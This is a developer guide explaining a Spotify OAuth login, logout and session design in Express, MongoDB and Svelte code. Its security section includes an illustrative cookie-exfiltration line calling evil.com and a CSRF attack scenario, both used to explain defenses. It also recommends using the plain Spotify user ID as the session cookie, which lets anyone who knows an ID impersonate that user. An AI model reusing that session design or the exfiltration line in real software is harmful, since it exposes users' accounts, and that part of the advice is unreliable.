# Spotify Authentication Flow - A Junior Developer's Guide

## Table of Contents
1. [Overview](#overview)
2. [Key Concepts](#key-concepts)
3. [Login Flow (OAuth 2.0)](#login-flow-oauth-20)
4. [Logout Flow](#logout-flow)
5. [Session Validation](#session-validation)
6. [Token Refresh (Future Implementation)](#token-refresh-future-implementation)
7. [Security Considerations](#security-considerations)
8. [Code Examples](#code-examples)

---

## Overview

This application uses **OAuth 2.0 Authorization Code Flow** to authenticate users with Spotify. Think of OAuth as a secure way to let users give our app permission to access their Spotify data without ever sharing their password with us.

**The Big Picture:**
- User wants to use our app
- We redirect them to Spotify's login page
- User logs in with Spotify (not our app!)
- Spotify sends them back to us with a special code
- We exchange that code for tokens (access token + refresh token)
- We use those tokens to access Spotify's API on behalf of the user

---

## Key Concepts

### 1. **Access Token**
- **What it is:** A temporary key that lets us access Spotify's API on behalf of the user
- **Lifespan:** 1 hour (3600 seconds)
- **Storage:** Stored in MongoDB, **never sent to the browser**
- **Purpose:** Used in every API call to Spotify (e.g., searching songs, creating playlists)
- **Example API call:**
  ```http
  GET https://api.spotify.com/v1/me
  Authorization: Bearer BQD4l...xyz123...abc
  ```

### 2. **Refresh Token**
- **What it is:** A long-lived key that can generate new access tokens
- **Lifespan:** Very long (weeks/months) or until revoked
- **Storage:** Stored in MongoDB, **never sent to the browser**
- **Purpose:** When the access token expires, we use the refresh token to get a new one without making the user log in again
- **Security:** Even more sensitive than access token - if leaked, someone could impersonate the user indefinitely

### 3. **Cookies**
We use **two different cookies** for different purposes:

#### Cookie #1: `spotify_auth_state`
- **Purpose:** CSRF (Cross-Site Request Forgery) protection during OAuth flow
- **Lifespan:** 10 minutes (only during login process)
- **Content:** Random 32-character string (e.g., `a3f2e1...`)
- **Flags:** `httpOnly` (JavaScript can't access it), `secure` in production (HTTPS only)

#### Cookie #2: `spotify_user_id`
- **Purpose:** Session identifier - tells us which user is making requests
- **Lifespan:** 30 days
- **Content:** User's Spotify ID (e.g., `31l77y2i7m5n3p4o6q8r9s0t1u2v`)
- **Flags:** `httpOnly`, `secure` in production
- **Why just the ID?** We don't store sensitive tokens in cookies. The user ID is just a reference to look up the real tokens in our database.

### 4. **Session Storage (MongoDB)**
- **What we store:**
  ```javascript
  {
    userId: "31l77y2i7m5n3p4o6q8r9s0t1u2v",
    accessToken: "BQD4l...xyz123...abc",    // Sensitive!
    refreshToken: "AQC9m...def456...ghi",   // Very sensitive!
    expiresAt: new Date("2025-12-21T15:30:00Z"),
    createdAt: new Date("2025-12-21T14:30:00Z")
  }
  ```
- **Why MongoDB?** Centralized, secure, can scale across multiple servers
- **TTL (Time-To-Live):** MongoDB automatically deletes expired sessions using an index on `expiresAt`

---

## Login Flow (OAuth 2.0)

This is the most complex part - let's break it down step by step.

```mermaid
sequenceDiagram
    participant User as User Browser
    participant Frontend as Frontend (Svelte)
    participant Backend as Backend (Express)
    participant Spotify as Spotify OAuth
    participant DB as MongoDB

    User->>Frontend: Click "Login with Spotify"
    Frontend->>Backend: GET /auth/login

    Note over Backend: Generate random state<br/>(e.g., "a3f2e1...")
    Backend->>Backend: Set cookie: spotify_auth_state
    Backend->>Backend: Build Spotify OAuth URL
    Backend->>Frontend: Return { authUrl: "https://accounts.spotify.com/..." }

    Frontend->>User: Redirect to Spotify
    User->>Spotify: User sees Spotify login page
    User->>Spotify: Enter credentials & approve permissions

    Note over Spotify: Spotify validates user<br/>and generates authorization code

    Spotify->>Backend: Redirect to /auth/callback?code=xxx&state=a3f2e1...

    Note over Backend: Validate state matches cookie<br/>(CSRF protection)
    Backend->>Backend: Clear spotify_auth_state cookie

    Backend->>Spotify: POST /api/token<br/>Exchange code for tokens
    Spotify->>Backend: { access_token, refresh_token, expires_in: 3600 }

    Backend->>Spotify: GET /v1/me (using access_token)
    Spotify->>Backend: { id: "31l77y...", display_name: "John", ... }

    Backend->>DB: Store session<br/>{ userId, accessToken, refreshToken, expiresAt }
    DB->>Backend: Session stored

    Backend->>Backend: Set cookie: spotify_user_id = "31l77y..."
    Backend->>Frontend: Redirect to /?auth=success

    Frontend->>User: Show logged-in UI
```

### Detailed Step-by-Step Explanation

#### Step 1-3: Initiate OAuth Flow
```typescript
// User clicks login button → Frontend calls:
GET /auth/login

// Backend generates random state for security
const state = crypto.randomBytes(16).toString('hex');
// e.g., "a3f2e1d4c5b6a7f8e9d0c1b2a3f4e5d6"

// Backend sets cookie (user's browser stores this)
res.cookie('spotify_auth_state', state, {
  httpOnly: true,  // JavaScript can't access it
  secure: true,    // HTTPS only (in production)
  maxAge: 600000   // 10 minutes
});

// Backend builds Spotify URL
const authUrl = "https://accounts.spotify.com/authorize?" +
  "client_id=YOUR_CLIENT_ID" +
  "&response_type=code" +
  "&redirect_uri=http://localhost:3000/auth/callback" +
  "&state=a3f2e1d4c5b6a7f8e9d0c1b2a3f4e5d6" +
  "&scope=user-read-private playlist-modify-public";

// Frontend redirects user to Spotify
window.location.href = authUrl;
```

#### Step 4-5: User Logs In at Spotify
- User is now on Spotify's website (not ours!)
- User enters their Spotify username/password
- User sees permission request: "This app wants to access your playlists..."
- User clicks "Agree"

#### Step 6-7: Spotify Redirects Back with Code
```
Spotify redirects user's browser to:
http://localhost:3000/auth/callback?code=AQC9m...&state=a3f2e1d4c5b6a7f8e9d0c1b2a3f4e5d6
```

The **code** is a one-time-use authorization code (expires in ~10 minutes). We need to quickly exchange it for tokens.

#### Step 8-9: Validate State (CSRF Protection)
```typescript
const { code, state } = req.query;
const storedState = req.cookies.spotify_auth_state;

// CRITICAL: Check state matches
if (state !== storedState) {
  // This might be a CSRF attack!
  return res.redirect('/?error=state_mismatch');
}

// Clear the state cookie (one-time use)
res.clearCookie('spotify_auth_state');
```

**Why is state important?** Imagine an attacker tricks you into clicking a malicious link that redirects to our callback URL with a code the attacker controls. Without state validation, we might accept it! The state parameter ensures the callback is from a flow **we** initiated.

#### Step 10-11: Exchange Code for Tokens
```typescript
// Backend calls Spotify's token endpoint
POST https://accounts.spotify.com/api/token
Content-Type: application/x-www-form-urlencoded
Authorization: Basic <base64(CLIENT_ID:CLIENT_SECRET)>

Body:
  grant_type=authorization_code
  code=AQC9m...
  redirect_uri=http://localhost:3000/auth/callback

// Spotify responds with tokens
{
  "access_token": "BQD4l...xyz123...abc",
  "token_type": "Bearer",
  "expires_in": 3600,  // 1 hour
  "refresh_token": "AQC9m...def456...ghi",
  "scope": "user-read-private playlist-modify-public"
}
```

#### Step 12-13: Get User Profile
```typescript
// Use the access token to identify the user
GET https://api.spotify.com/v1/me
Authorization: Bearer BQD4l...xyz123...abc

// Response
{
  "id": "31l77y2i7m5n3p4o6q8r9s0t1u2v",
  "display_name": "John Doe",
  "email": "john@example.com",
  "images": [...]
}
```

#### Step 14-15: Store Session in Database
```typescript
await db.collection('sessions').updateOne(
  { userId: "31l77y2i7m5n3p4o6q8r9s0t1u2v" },
  {
    $set: {
      userId: "31l77y2i7m5n3p4o6q8r9s0t1u2v",
      accessToken: "BQD4l...xyz123...abc",
      refreshToken: "AQC9m...def456...ghi",
      expiresAt: new Date(Date.now() + 3600 * 1000), // 1 hour from now
      createdAt: new Date()
    }
  },
  { upsert: true }  // Create if doesn't exist
);
```

#### Step 16-17: Set Session Cookie
```typescript
// Store only the user ID in the cookie (not the tokens!)
res.cookie('spotify_user_id', "31l77y2i7m5n3p4o6q8r9s0t1u2v", {
  httpOnly: true,
  secure: true,  // HTTPS only in production
  maxAge: 30 * 24 * 60 * 60 * 1000  // 30 days
});

// Redirect user back to frontend
res.redirect('http://localhost:5173/?auth=success');
```

#### Step 18: User is Logged In
The frontend checks the URL parameter `?auth=success` and shows the logged-in UI.

---

## Logout Flow

Much simpler than login!

```mermaid
sequenceDiagram
    participant User as User Browser
    participant Frontend as Frontend (Svelte)
    participant Backend as Backend (Express)
    participant DB as MongoDB

    User->>Frontend: Click "Logout"
    Frontend->>Backend: POST /auth/logout<br/>(cookie: spotify_user_id sent automatically)

    Backend->>Backend: Read userId from cookie
    Backend->>DB: DELETE session WHERE userId = "31l77y..."
    DB->>Backend: Session deleted

    Backend->>Backend: Clear spotify_user_id cookie
    Backend->>Frontend: { message: "Logged out successfully" }

    Frontend->>Frontend: Clear user state
    Frontend->>User: Show login UI
```

### Step-by-Step

```typescript
// Frontend
await api.post('/auth/logout');  // Cookie sent automatically

// Backend
const userId = req.cookies.spotify_user_id;

if (userId) {
  // Delete session from database
  await db.collection('sessions').deleteOne({ userId });

  // Clear cookie
  res.clearCookie('spotify_user_id');
}

res.json({ message: 'Logged out successfully' });
```

**Important:** This only logs the user out of **our app**, not out of Spotify. Their Spotify session remains active.

---

## Session Validation

Every time the user makes an authenticated request (like searching for songs), we need to validate their session.

```mermaid
sequenceDiagram
    participant User as User Browser
    participant Frontend as Frontend (Svelte)
    participant Backend as Backend (Express)
    participant DB as MongoDB
    participant Spotify as Spotify API

    User->>Frontend: Page load / Make API request
    Frontend->>Backend: GET /auth/me<br/>(cookie: spotify_user_id sent automatically)

    Backend->>Backend: Read userId from cookie

    alt userId exists
        Backend->>DB: Find session WHERE userId = "31l77y..."

        alt Session found
            DB->>Backend: { accessToken, refreshToken, expiresAt, ... }
            Backend->>Spotify: GET /v1/me (using accessToken)

            alt Token valid
                Spotify->>Backend: { id, display_name, email, ... }
                Backend->>Frontend: { user: { id, display_name, ... } }
                Frontend->>User: Show user info
            else Token expired (401)
                Spotify->>Backend: 401 Unauthorized
                Backend->>Backend: Clear spotify_user_id cookie
                Backend->>Frontend: 401 { error: "Session expired" }
                Frontend->>User: Redirect to login
            end
        else Session not found
            DB->>Backend: null
            Backend->>Backend: Clear spotify_user_id cookie
            Backend->>Frontend: 401 { error: "Session expired" }
            Frontend->>User: Redirect to login
        end
    else No userId cookie
        Backend->>Frontend: 401 { error: "Not authenticated" }
        Frontend->>User: Show login UI
    end
```

### Code Walkthrough

```typescript
// Frontend (runs on app load)
try {
  const response = await api.get('/auth/me');
  // User is logged in, show their info
  setUser(response.user);
} catch (error) {
  // Not logged in or session expired
  setUser(null);
}

// Backend
const userId = req.cookies.spotify_user_id;

if (!userId) {
  return res.status(401).json({ error: 'Not authenticated' });
}

// Look up session in database
const session = await db.collection('sessions').findOne({ userId });

if (!session) {
  res.clearCookie('spotify_user_id');
  return res.status(401).json({ error: 'Session expired' });
}

// Validate token is still good by calling Spotify
try {
  const user = await getCurrentUser(session.accessToken);
  return res.json({ user });
} catch (error) {
  if (error.response?.status === 401) {
    // Token expired
    res.clearCookie('spotify_user_id');
    return res.status(401).json({ error: 'Session expired' });
  }
  throw error;
}
```

---

## Token Refresh (Future Implementation)

**Current State:** Token refresh is not yet implemented. When the access token expires (after 1 hour), the user must log in again.

**Planned Implementation:** Here's how token refresh will work:

```mermaid
sequenceDiagram
    participant Backend as Backend (Express)
    participant DB as MongoDB
    participant Spotify as Spotify API

    Note over Backend: Making API call with<br/>potentially expired token

    Backend->>DB: Get session for userId
    DB->>Backend: { accessToken, refreshToken, expiresAt }

    Backend->>Backend: Check: Is token expiring soon?<br/>(< 5 minutes remaining)

    alt Token expiring or expired
        Backend->>Spotify: POST /api/token<br/>grant_type=refresh_token<br/>refresh_token=AQC9m...
        Spotify->>Backend: { access_token: NEW_TOKEN, expires_in: 3600 }

        Backend->>DB: Update session<br/>SET accessToken = NEW_TOKEN<br/>SET expiresAt = NOW + 3600
        DB->>Backend: Updated

        Backend->>Spotify: Make API call with NEW_TOKEN
        Spotify->>Backend: Success
    else Token still valid
        Backend->>Spotify: Make API call with existing token
        Spotify->>Backend: Success
    end
```

### How Token Refresh Works

```typescript
// Refresh the access token using the refresh token
async function refreshAccessToken(refreshToken: string) {
  const response = await axios.post(
    'https://accounts.spotify.com/api/token',
    new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: refreshToken
    }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': `Basic ${base64(CLIENT_ID + ':' + CLIENT_SECRET)}`
      }
    }
  );

  return {
    access_token: response.data.access_token,
    expires_in: response.data.expires_in  // Usually 3600 (1 hour)
  };
}

// Before making any Spotify API call, check if token needs refresh
async function makeSpotifyApiCall(userId: string, endpoint: string) {
  const session = await sessionStore.get(userId);

  // Check if token expires in < 5 minutes
  const expiresIn = (session.expiresAt.getTime() - Date.now()) / 1000;

  if (expiresIn < 300) {  // 5 minutes
    // Refresh the token
    const newTokens = await refreshAccessToken(session.refreshToken);

    // Update session in database
    await sessionStore.update(userId, newTokens);

    // Use new token
    return await axios.get(endpoint, {
      headers: { Authorization: `Bearer ${newTokens.access_token}` }
    });
  } else {
    // Token still good, use it
    return await axios.get(endpoint, {
      headers: { Authorization: `Bearer ${session.accessToken}` }
    });
  }
}
```

**Benefits:**
- User stays logged in for 30 days (as long as they use the app)
- Seamless experience - no re-login required
- More secure - access tokens are short-lived

**Note:** Refresh tokens can be revoked by the user (e.g., if they revoke permissions in Spotify settings), so we must handle cases where refresh fails.

---

## Security Considerations

### 1. **Why httpOnly Cookies?**
```typescript
res.cookie('spotify_user_id', userId, {
  httpOnly: true,  // ← This is critical!
  secure: true,
  maxAge: 30 * 24 * 60 * 60 * 1000
});
```

**Without httpOnly:** JavaScript can access cookies via `document.cookie`. If a hacker injects malicious JavaScript (XSS attack), they could steal the cookie and impersonate the user.

**With httpOnly:** JavaScript **cannot** access the cookie. Only the browser sends it with HTTP requests.

### 2. **Why Not Store Tokens in Cookies or LocalStorage?**

**Bad Idea #1: Store access token in localStorage**
```javascript
// DON'T DO THIS!
localStorage.setItem('access_token', 'BQD4l...');
```
- XSS attacks can easily steal it via `localStorage.getItem('access_token')`
- localStorage persists forever until cleared
- Anyone with access to the device can view it

**Bad Idea #2: Store access token in cookie (even httpOnly)**
```javascript
// DON'T DO THIS!
res.cookie('access_token', token, { httpOnly: true });
```
- Cookies are sent with **every request**, even images: `<img src="evil.com/steal?cookie=...">`
- Increases attack surface
- If cookie size is too large, requests fail

**Our Approach: Store tokens in database, only user ID in cookie**
- Cookie only contains non-sensitive user ID
- Tokens are in database (encrypted at rest, secured by MongoDB authentication)
- Even if cookie is stolen, attacker can't get tokens without database access

### 3. **CSRF Protection with State Parameter**

**The Attack Scenario:**
1. Attacker creates a malicious website: `evil.com`
2. Attacker starts OAuth flow, gets a code from Spotify
3. Attacker tricks you into clicking: `evil.com/attack` which redirects to:
   ```
   http://ourapp.com/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE
   ```
4. Without state validation, our app would accept this and log you in as the attacker!

**Our Defense:**
- We generate a random `state` and store it in a cookie **before** redirecting to Spotify
- When Spotify redirects back, we verify `state` matches what we stored
- Attacker can't forge this because they don't know our random state

```typescript
// Step 1: Generate state
const state = crypto.randomBytes(16).toString('hex');
res.cookie('spotify_auth_state', state, { httpOnly: true });

// Step 2: Verify state
if (req.query.state !== req.cookies.spotify_auth_state) {
  return res.redirect('/?error=state_mismatch');
}
```

### 4. **Secure Cookie Flag**

```typescript
res.cookie('spotify_user_id', userId, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',  // ← HTTPS only in production
  maxAge: 30 * 24 * 60 * 60 * 1000
});
```

**In production (`secure: true`):**
- Cookie is **only sent over HTTPS**
- Man-in-the-middle attackers on public WiFi can't intercept it

**In development (`secure: false`):**
- We use `http://localhost` for convenience
- Never deploy to production without HTTPS!

### 5. **Session Expiration & MongoDB TTL**

```typescript
// MongoDB automatically deletes expired sessions
await db.collection('sessions').createIndex(
  { expiresAt: 1 },
  { expireAfterSeconds: 0 }
);
```

**Benefits:**
- Old sessions don't pile up in database
- If tokens leak, they're automatically invalidated after expiration
- Reduces storage costs

---

## Code Examples

### Full Login Flow (Backend)

```typescript
// FILE: backend/src/routes/auth.ts

import express from 'express';
import crypto from 'crypto';
import { getAuthorizationUrl, getAccessToken, getCurrentUser } from '../services/spotifyService.js';
import { sessionStore } from '../db/mongodb.js';

const router = express.Router();

// Step 1: Initiate OAuth flow
router.get('/login', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');

  res.cookie('spotify_auth_state', state, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 10 * 60 * 1000  // 10 minutes
  });

  const authUrl = getAuthorizationUrl(state);
  res.json({ authUrl });
});

// Step 2: Handle callback from Spotify
router.get('/callback', async (req, res) => {
  const { code, state } = req.query;
  const storedState = req.cookies.spotify_auth_state;

  // Clear state cookie
  res.clearCookie('spotify_auth_state');

  // Validate state (CSRF protection)
  if (!state || state !== storedState) {
    return res.redirect('/?error=state_mismatch');
  }

  try {
    // Exchange code for tokens
    const tokens = await getAccessToken(code);

    // Get user profile
    const user = await getCurrentUser(tokens.access_token);

    // Store session in MongoDB
    await sessionStore.create(user.id, tokens);

    // Set session cookie
    res.cookie('spotify_user_id', user.id, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      maxAge: 30 * 24 * 60 * 60 * 1000  // 30 days
    });

    res.redirect('/?auth=success');
  } catch (error) {
    res.redirect('/?error=auth_failed');
  }
});

// Validate session
router.get('/me', async (req, res) => {
  const userId = req.cookies.spotify_user_id;

  if (!userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  const session = await sessionStore.get(userId);

  if (!session) {
    res.clearCookie('spotify_user_id');
    return res.status(401).json({ error: 'Session expired' });
  }

  try {
    const user = await getCurrentUser(session.accessToken);
    res.json({ user });
  } catch (error) {
    if (error.response?.status === 401) {
      res.clearCookie('spotify_user_id');
      return res.status(401).json({ error: 'Session expired' });
    }
    throw error;
  }
});

// Logout
router.post('/logout', async (req, res) => {
  const userId = req.cookies.spotify_user_id;

  if (userId) {
    await sessionStore.delete(userId);
    res.clearCookie('spotify_user_id');
  }

  res.json({ message: 'Logged out successfully' });
});

export default router;
```

### Frontend Integration

```typescript
// FILE: frontend/src/lib/api.ts

import axios from 'axios';

const api = axios.create({
  baseURL: '',  // Vite proxy handles routing
  withCredentials: true  // ← Critical: Send cookies with requests
});

export const auth = {
  async login() {
    // Get Spotify OAuth URL
    const response = await api.get('/auth/login');
    // Redirect user to Spotify
    window.location.href = response.data.authUrl;
  },

  async getMe() {
    const response = await api.get('/auth/me');
    return response.data.user;
  },

  async logout() {
    await api.post('/auth/logout');
  }
};
```

```svelte
<!-- FILE: frontend/src/App.svelte -->

<script>
  import { onMount } from 'svelte';
  import { auth } from './lib/api';

  let user = null;
  let loading = true;

  onMount(async () => {
    // Check if user is logged in
    try {
      user = await auth.getMe();
    } catch (error) {
      // Not logged in
      user = null;
    } finally {
      loading = false;
    }
  });

  async function handleLogin() {
    await auth.login();  // Redirects to Spotify
  }

  async function handleLogout() {
    await auth.logout();
    user = null;
  }
</script>

{#if loading}
  <p>Loading...</p>
{:else if user}
  <div>
    <h1>Welcome, {user.display_name}!</h1>
    <button on:click={handleLogout}>Logout</button>
  </div>
{:else}
  <button on:click={handleLogin}>Login with Spotify</button>
{/if}
```

---

## Summary

### The Complete Picture

1. **Login:** User clicks login → redirected to Spotify → approves permissions → redirected back → we get tokens → tokens stored in MongoDB → user ID stored in cookie → user is logged in

2. **Making Requests:** Frontend makes request → browser sends cookie → backend reads user ID → looks up tokens in MongoDB → uses access token to call Spotify API → returns data

3. **Logout:** User clicks logout → backend deletes session from MongoDB → clears cookie → user is logged out

4. **Security:**
   - Tokens never leave the backend
   - Cookies are httpOnly (JavaScript can't access them)
   - State parameter prevents CSRF
   - HTTPS in production (secure flag)
   - Automatic session expiration

### Key Takeaways for Junior Developers

- **OAuth is complex, but necessary:** It keeps user passwords safe by never sharing them with third-party apps
- **Tokens are like keys:** Access token is a temporary key, refresh token is a master key
- **Cookies are messengers:** They carry the user ID, not the sensitive tokens
- **Database is the vault:** Tokens are stored securely in MongoDB, not in the browser
- **State prevents attacks:** CSRF protection ensures callbacks are legitimate
- **Always use httpOnly:** Never let JavaScript access authentication cookies

---

**Questions? Common Pitfalls?**

**Q: Why can't I just store the access token in localStorage and skip all this complexity?**
A: Security! XSS attacks can steal localStorage easily. Our architecture protects tokens by keeping them server-side.

**Q: What happens if MongoDB goes down?**
A: All active users will be logged out (can't validate sessions). They'll need to log in again once it's back up.

**Q: Can I use the access token from the frontend?**
A: No! It's never sent to the browser. All Spotify API calls must go through our backend.

**Q: What if someone steals the `spotify_user_id` cookie?**
A: They can make requests as that user, but only until the session expires (30 days or when user logs out). They can't get the actual tokens without database access. Use HTTPS in production to prevent cookie theft.
